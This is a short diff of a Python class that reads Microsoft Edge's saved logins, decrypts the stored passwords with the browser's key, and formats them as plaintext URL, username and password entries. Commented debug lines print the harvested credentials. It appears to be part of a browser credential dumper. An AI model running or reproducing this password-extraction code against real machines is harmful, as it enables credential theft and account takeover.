@@ -82,8 +82,8 @@ class MicrosoftEdge:
                                 ciphertext = login[2]
                                 if (url != "" and username != "" and ciphertext != ""):
                                     decrypted_pass = self.decrypt_password(ciphertext, encrypted_key)
-                                    message = str(index) + " " + ("=" * 50+"\n")
-                                    message += f"URL: {url}\n"
+                                    # message = str(index) + " " + ("=" * 50+"\n")
+                                    message = f"URL: {url}\n"
                                     message += f"Username: {username}\n"
                                     message += f"Password: {decrypted_pass}\n\n"
                                     credentials += message 
@@ -190,5 +190,7 @@ class MicrosoftEdge:
             return e
             
 edge_browser = MicrosoftEdge()
-
-
+# print(edge_browser.get_edge_creds())
+# edge_password_lines = [line for line in  edge_browser.get_edge_creds() if not line.startswith("Password")]
+# print(edge_password_lines)
+# # print(edge_browser.edge_downloads())
